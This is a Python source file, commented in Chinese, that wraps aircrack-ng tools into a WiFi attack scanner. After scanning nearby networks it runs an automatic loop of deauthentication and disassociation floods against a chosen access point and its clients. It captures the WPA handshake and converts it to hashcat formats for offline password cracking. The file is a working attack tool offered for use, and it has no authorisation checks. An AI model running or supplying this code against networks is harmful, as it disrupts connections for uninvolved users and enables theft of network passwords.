#!/usr/bin/env python3
"""WiFi Scanner - 封装 airodump-ng 扫描功能（优化版）"""

import subprocess
import os
import json
import time
import threading
from datetime import datetime
from pathlib import Path

class WiFiScanner:
    def __init__(self, capture_dir="/opt/wifi-capture/captures"):
        self.capture_dir = Path(capture_dir)
        self.capture_dir.mkdir(parents=True, exist_ok=True)
        self.interface = None
        self.mon_interface = None
        self.scan_process = None
        self.capture_process = None
        self.attack_process = None
        self.is_scanning = False
        self.is_capturing = False
        self.current_target = None
        self.networks = []  # 持久化网络列表
        self.networks_cache = {}  # 用于合并去重
        self.scan_file = None
        self.attack_thread = None
        self.attack_running = False
        
    def find_interface(self):
        """查找无线网卡"""
        try:
            result = subprocess.run(
                ["iw", "dev"],
                capture_output=True,
                text=True,
                timeout=10
            )
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    self.interface = line.split()[-1]
                    return self.interface
        except Exception as e:
            print(f"Error finding interface: {e}")
        return None
    
    def enable_monitor_mode(self):
        """启用监听模式"""
        if not self.interface:
            if not self.find_interface():
                return False
        
        try:
            # 停止干扰进程
            subprocess.run(["airmon-ng", "check", "kill"], 
                         capture_output=True, timeout=30)
            
            # 启用监听模式
            subprocess.run(["airmon-ng", "start", self.interface],
                         capture_output=True, timeout=30)
            
            # 确定监听接口名称
            self.mon_interface = f"{self.interface}mon"
            
            # 验证
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
            if self.mon_interface not in result.stdout:
                self.mon_interface = self.interface
                
            return True
        except Exception as e:
            print(f"Error enabling monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self):
        """禁用监听模式"""
        if self.mon_interface:
            try:
                subprocess.run(["airmon-ng", "stop", self.mon_interface],
                             capture_output=True, timeout=30)
            except:
                pass
    
    def start_scan(self, duration=30):
        """开始扫描"""
        if self.is_scanning:
            return False
            
        if not self.mon_interface:
            if not self.enable_monitor_mode():
                return False
        
        self.is_scanning = True
        self.scan_file = self.capture_dir / f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        def scan_thread():
            try:
                self.scan_process = subprocess.Popen(
                    ["airodump-ng",
                     "--write", str(self.scan_file),
                     "--write-interval", "3",
                     "--output-format", "csv",
                     self.mon_interface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(duration)
            finally:
                self.stop_scan()
        
        thread = threading.Thread(target=scan_thread, daemon=True)
        thread.start()
        return True
    
    def stop_scan(self):
        """停止扫描"""
        if self.scan_process:
            try:
                self.scan_process.terminate()
                self.scan_process.wait(timeout=5)
            except:
                self.scan_process.kill()
            self.scan_process = None
        self.is_scanning = False
        self._parse_scan_results()
    
    def _parse_scan_results(self):
        """解析扫描结果 - 合并而不是清空"""
        if not self.scan_file:
            return
            
        csv_file = f"{self.scan_file}-01.csv"
        
        if not os.path.exists(csv_file):
            return
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # 分割 AP 和客户端部分
            parts = content.split('\n\n')
            if not parts:
                parts = content.split('\r\n\r\n')
            if not parts:
                return
            
            ap_section = parts[0]
            lines = ap_section.strip().split('\n')
            
            for line in lines[2:]:  # 跳过标题行
                fields = line.split(',')
                if len(fields) >= 14:
                    bssid = fields[0].strip().upper()
                    if not bssid or ':' not in bssid:
                        continue
                    
                    try:
                        channel = int(fields[3].strip()) if fields[3].strip() else 0
                        power = int(fields[8].strip()) if fields[8].strip() else -100
                    except:
                        channel = 0
                        power = -100
                    
                    if channel <= 0 or channel > 165:
                        continue
                    
                    essid = fields[13].strip() if len(fields) > 13 else '<Hidden>'
                    if essid == '':
                        essid = '<Hidden>'
                    
                    network = {
                        'bssid': bssid,
                        'channel': channel,
                        'power': power,
                        'encryption': fields[5].strip() if len(fields) > 5 else '',
                        'cipher': fields[6].strip() if len(fields) > 6 else '',
                        'auth': fields[7].strip() if len(fields) > 7 else '',
                        'essid': essid,
                        'clients': 0,
                        'last_seen': time.time()
                    }
                    
                    # 合并到缓存，更新已有网络的信号强度
                    self.networks_cache[bssid] = network
            
            # 从缓存重建网络列表，过滤太旧的（60秒未见）
            current_time = time.time()
            self.networks = [
                net for net in self.networks_cache.values()
                if current_time - net.get('last_seen', 0) < 60
            ]
            
            # 按信号强度排序
            self.networks.sort(key=lambda x: x['power'], reverse=True)
            
        except Exception as e:
            print(f"Error parsing scan results: {e}")
    
    def get_networks(self):
        """获取扫描到的网络列表"""
        if self.is_scanning:
            self._parse_scan_results()
        return self.networks
    
    def start_capture(self, bssid, channel, essid):
        """开始捕获握手包 - 带自动攻击"""
        if self.is_capturing:
            return False
        
        if not self.mon_interface:
            if not self.enable_monitor_mode():
                return False
        
        self.is_capturing = True
        self.attack_running = True
        self.current_target = {
            'bssid': bssid,
            'channel': channel,
            'essid': essid,
            'start_time': datetime.now().isoformat(),
            'status': 'capturing',
            'handshake': False,
            'attack_type': 'none',
            'attack_count': 0
        }
        
        safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-") or "hidden"
        capture_file = self.capture_dir / f"handshake_{safe_essid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.current_target['file'] = str(capture_file)
        
        def capture_thread():
            try:
                # 锁定信道
                subprocess.run(["iw", "dev", self.mon_interface, "set", "channel", str(channel)],
                             capture_output=True, timeout=5)
                
                self.capture_process = subprocess.Popen(
                    ["airodump-ng",
                     "--bssid", bssid,
                     "--channel", str(channel),
                     "--write", str(capture_file),
                     "--output-format", "pcap,csv",
                     self.mon_interface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # 启动自动攻击线程
                self.attack_thread = threading.Thread(
                    target=self._auto_attack_loop,
                    args=(bssid, channel),
                    daemon=True
                )
                self.attack_thread.start()
                
                # 监控握手包
                cap_file = f"{capture_file}-01.cap"
                while self.is_capturing:
                    time.sleep(3)
                    if os.path.exists(cap_file):
                        result = subprocess.run(
                            ["aircrack-ng", cap_file],
                            capture_output=True,
                            text=True,
                            timeout=10
                        )
                        if "1 handshake" in result.stdout:
                            self.current_target['handshake'] = True
                            self.current_target['status'] = 'success'
                            self.attack_running = False
                            print(f"[+] 捕获到握手包: {essid}")
                            
                            # 自动转换为 hc22000 格式
                            self._convert_to_hashcat(cap_file)
                            
                            # 自动停止捕获
                            self._stop_capture_internal()
                            break
                            
            except Exception as e:
                print(f"Capture error: {e}")
                if self.current_target:
                    self.current_target['status'] = 'error'
            finally:
                self.attack_running = False
                self._stop_attack()
        
        thread = threading.Thread(target=capture_thread, daemon=True)
        thread.start()
        return True
    
    def _auto_attack_loop(self, bssid, channel):
        """自动攻击循环 - 尝试多种攻击方式"""
        attack_methods = [
            ('deauth_broadcast', self._attack_deauth_broadcast),
            ('deauth_targeted', self._attack_deauth_targeted),
            ('disassoc', self._attack_disassoc),
            ('deauth_burst', self._attack_deauth_burst),
        ]
        
        round_num = 0
        while self.attack_running and self.is_capturing:
            round_num += 1
            
            for attack_name, attack_func in attack_methods:
                if not self.attack_running or not self.is_capturing:
                    break
                
                if self.current_target:
                    self.current_target['attack_type'] = attack_name
                    self.current_target['attack_count'] = round_num
                
                self._current_attack_type = attack_name
                self._attack_count = round_num
                
                print(f"[*] 第{round_num}轮 攻击方式: {attack_name}")
                try:
                    attack_func(bssid, channel)
                except Exception as e:
                    print(f"Attack error ({attack_name}): {e}")
                
                # 每次攻击后等待
                for _ in range(10):  # 等待 10 秒
                    if not self.attack_running:
                        break
                    time.sleep(1)
    
    def _attack_deauth_broadcast(self, bssid, channel):
        """广播 Deauth 攻击 - 断开所有客户端"""
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, self.mon_interface],
            capture_output=True, timeout=30
        )
    
    def _attack_deauth_targeted(self, bssid, channel):
        """针对性 Deauth - 攻击已连接的客户端"""
        # 获取客户端列表
        clients = self._get_connected_clients(bssid)
        for client in clients[:3]:  # 最多攻击 3 个客户端
            if not self.attack_running:
                break
            subprocess.run(
                ["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, self.mon_interface],
                capture_output=True, timeout=15
            )
            time.sleep(1)
    
    def _attack_disassoc(self, bssid, channel):
        """发送 Disassociation 帧"""
        # 使用 mdk3/mdk4 或回退到 deauth
        try:
            subprocess.run(
                ["mdk4", self.mon_interface, "d", "-B", bssid, "-c", str(channel)],
                capture_output=True, timeout=10
            )
        except:
            # 回退到 deauth
            subprocess.run(
                ["aireplay-ng", "--deauth", "15", "-a", bssid, self.mon_interface],
                capture_output=True, timeout=30
            )
    
    def _attack_deauth_burst(self, bssid, channel):
        """爆发式 Deauth - 大量发送"""
        for _ in range(3):
            if not self.attack_running:
                break
            subprocess.Popen(
                ["aireplay-ng", "--deauth", "20", "-a", bssid, self.mon_interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            time.sleep(2)
    
    def _get_connected_clients(self, bssid):
        """获取连接到指定 AP 的客户端"""
        clients = []
        try:
            # 从捕获文件中解析客户端
            if self.current_target and 'file' in self.current_target:
                csv_file = f"{self.current_target['file']}-01.csv"
                if os.path.exists(csv_file):
                    with open(csv_file, 'r', errors='ignore') as f:
                        content = f.read()
                    # 查找客户端部分
                    parts = content.split('Station MAC')
                    if len(parts) > 1:
                        for line in parts[1].split('\n')[1:]:
                            fields = line.split(',')
                            if len(fields) >= 6:
                                client_mac = fields[0].strip()
                                ap_mac = fields[5].strip()
                                if ap_mac.upper() == bssid.upper() and ':' in client_mac:
                                    clients.append(client_mac)
        except:
            pass
        return clients
    
    def _stop_attack(self):
        """停止攻击进程"""
        self.attack_running = False
        # 杀死可能的 aireplay-ng 进程
        try:
            subprocess.run(["pkill", "-f", "aireplay-ng"], capture_output=True, timeout=5)
        except:
            pass
    
    def _stop_capture_internal(self):
        """内部停止捕获（捕获成功后调用）"""
        if self.capture_process:
            try:
                self.capture_process.terminate()
                self.capture_process.wait(timeout=5)
            except:
                try:
                    self.capture_process.kill()
                except:
                    pass
            self.capture_process = None
        
        self.is_capturing = False
        print("[+] 捕获已自动停止")
    
    def _convert_to_hashcat(self, cap_file):
        """转换 cap 文件为 hashcat 格式 (hc22000)"""
        try:
            hc_file = cap_file.replace('.cap', '.hc22000')
            # 使用 hcxpcapngtool 转换
            result = subprocess.run(
                ["hcxpcapngtool", "-o", hc_file, cap_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            if os.path.exists(hc_file):
                print(f"[+] 已转换为 hashcat 格式: {hc_file}")
                return hc_file
        except Exception as e:
            print(f"[-] 转换失败: {e}")
        return None
    
    def convert_capture(self, cap_file, format_type):
        """转换捕获文件为指定格式"""
        if not os.path.exists(cap_file):
            return None
        
        base_name = cap_file.rsplit('.', 1)[0]
        
        if format_type == 'hc22000':
            output_file = f"{base_name}.hc22000"
            if os.path.exists(output_file):
                return output_file
            try:
                subprocess.run(
                    ["hcxpcapngtool", "-o", output_file, cap_file],
                    capture_output=True, timeout=30
                )
                if os.path.exists(output_file):
                    return output_file
            except:
                pass
        
        elif format_type == 'pmkid':
            output_file = f"{base_name}.pmkid"
            if os.path.exists(output_file):
                return output_file
            try:
                subprocess.run(
                    ["hcxpcapngtool", "-k", output_file, cap_file],
                    capture_output=True, timeout=30
                )
                if os.path.exists(output_file):
                    return output_file
            except:
                pass
        
        elif format_type == 'hccapx':
            output_file = f"{base_name}.hccapx"
            if os.path.exists(output_file):
                return output_file
            try:
                # 先尝试使用 hcxpcapngtool
                subprocess.run(
                    ["hcxpcapngtool", "-o", f"{base_name}.hc22000", cap_file],
                    capture_output=True, timeout=30
                )
                # hccapx 是旧格式，可以用 cap2hccapx 或直接用 hc22000
                if os.path.exists(f"{base_name}.hc22000"):
                    return f"{base_name}.hc22000"  # 返回 hc22000 作为替代
            except:
                pass
        
        return None
    
    def stop_capture(self):
        """停止捕获"""
        self.attack_running = False
        self._stop_attack()
        
        if self.capture_process:
            try:
                self.capture_process.terminate()
                self.capture_process.wait(timeout=5)
            except:
                try:
                    self.capture_process.kill()
                except:
                    pass
            self.capture_process = None
        
        if self.current_target and self.current_target['status'] == 'capturing':
            self.current_target['status'] = 'stopped'
        
        self.is_capturing = False
    
    def send_deauth(self, bssid, count=5):
        """发送 deauth 包"""
        if not self.mon_interface:
            return False
        
        try:
            subprocess.Popen(
                ["aireplay-ng", "--deauth", str(count), "-a", bssid, self.mon_interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return True
        except:
            return False
    
    def get_captures(self):
        """获取已捕获的握手包列表"""
        captures = []
        for f in self.capture_dir.glob("handshake_*-01.cap"):
            # 检查是否包含握手包
            try:
                result = subprocess.run(
                    ["aircrack-ng", str(f)],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                has_handshake = "1 handshake" in result.stdout
            except:
                has_handshake = False
            
            stat = f.stat()
            base_name = str(f).rsplit('.', 1)[0]
            
            # 检查可用的格式
            available_formats = ['cap']  # 原始格式总是可用
            if os.path.exists(f"{base_name}.hc22000"):
                available_formats.append('hc22000')
            if os.path.exists(f"{base_name}.pmkid"):
                available_formats.append('pmkid')
            
            captures.append({
                'filename': f.name,
                'path': str(f),
                'size': stat.st_size,
                'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                'has_handshake': has_handshake,
                'available_formats': available_formats,
                'supported_formats': ['cap', 'hc22000', 'pmkid']  # 支持转换的格式
            })
        
        captures.sort(key=lambda x: x['created'], reverse=True)
        return captures
    
    def get_status(self):
        """获取当前状态"""
        return {
            'interface': self.interface,
            'mon_interface': self.mon_interface,
            'is_scanning': self.is_scanning,
            'is_capturing': self.is_capturing,
            'current_target': self.current_target,
            'network_count': len(self.networks),
            'attack_running': self.attack_running,
            'attack_type': getattr(self, '_current_attack_type', None),
            'attack_count': getattr(self, '_attack_count', 0)
        }
    
    def delete_capture(self, filename):
        """删除捕获文件"""
        try:
            cap_path = self.capture_dir / filename
            if not cap_path.exists():
                return False
            
            # 删除主文件
            cap_path.unlink()
            
            # 删除相关文件 (csv, hc22000, pmkid 等)
            base_name = str(cap_path).rsplit('.', 1)[0]
            for ext in ['.csv', '.hc22000', '.pmkid', '.hccapx']:
                related_file = Path(base_name + ext)
                if related_file.exists():
                    related_file.unlink()
            
            # 删除同名的无后缀文件
            base_without_num = base_name.replace('-01', '')
            for f in self.capture_dir.glob(f"{Path(base_without_num).name}*"):
                try:
                    f.unlink()
                except:
                    pass
            
            return True
        except Exception as e:
            print(f"Delete error: {e}")
            return False
    
    def cleanup_old_files(self):
        """清理旧文件 - 删除无握手包的捕获和扫描文件"""
        deleted_count = 0
        
        try:
            # 删除无握手包的捕获文件
            for f in self.capture_dir.glob("handshake_*-01.cap"):
                try:
                    result = subprocess.run(
                        ["aircrack-ng", str(f)],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    if "1 handshake" not in result.stdout:
                        # 没有握手包，删除
                        self.delete_capture(f.name)
                        deleted_count += 1
                except:
                    pass
            
            # 删除扫描文件
            for f in self.capture_dir.glob("scan_*.csv"):
                try:
                    f.unlink()
                    deleted_count += 1
                except:
                    pass
            
        except Exception as e:
            print(f"Cleanup error: {e}")
        
        return deleted_count
    
    def cleanup(self):
        """清理资源"""
        self.stop_scan()
        self.stop_capture()
        self.disable_monitor_mode()
        
        # 重启网络服务
        try:
            subprocess.run(["service", "NetworkManager", "start"],
                         capture_output=True, timeout=10)
        except:
            pass


# 全局实例
scanner = WiFiScanner()
